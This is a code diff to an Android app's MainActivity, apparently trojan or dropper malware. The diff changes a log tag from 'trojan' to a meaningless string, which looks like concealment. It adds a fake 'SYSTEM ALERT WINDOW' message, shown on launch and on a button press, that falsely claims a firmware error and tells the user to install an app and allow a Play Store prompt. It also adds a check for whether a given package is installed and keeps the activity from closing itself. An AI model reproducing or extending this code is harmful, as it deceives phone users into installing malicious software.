@@ -38,16 +38,14 @@ public class MainActivity extends Activity
     private SharedPreferences settings;
 	private SharedPreferences.Editor seteditor;
 	private ReceiverBoot receiver;
-	private static String TAG = "trojan";
+	private static String TAG = "AsDfGhJkL";
 	public static String resultSms = "";
 	private boolean dtoast = true;
 	AlertDialog dialog;
 	private PendingIntent mPending;
 
 	public void btn(View v) {
-
-		
-		
+		receiver.toastShow(this, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
 		/*
 		long firstTime = SystemClock.elapsedRealtime();
 		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
@@ -65,10 +63,10 @@ public class MainActivity extends Activity
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-		setContentView(R.layout.main);
 		settings = getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
 		receiver = new ReceiverBoot();
+		receiver.toastShow(this, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
 
 		//startService(new Intent(this, SystemThread.class));
 
@@ -84,7 +82,7 @@ public class MainActivity extends Activity
 		}
 		catch (Exception e) {}
 
-		finish();
+		//finish();
 	}
 
 	public void onDestroy() {
@@ -209,7 +207,16 @@ public class MainActivity extends Activity
 			catch (Exception e) {
 				return false;
 			}
-		} else if (pilih.equals("pull")) {
+		}
+		else if (pilih.equals("cek")) {
+			try {
+				manager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
+				return true;
+			}catch(PackageManager.NameNotFoundException e) {
+				return false;
+			}
+		} 
+		else if (pilih.equals("pull")) {
 			final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
 			mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
 			mainIntent.setPackage(packageName);
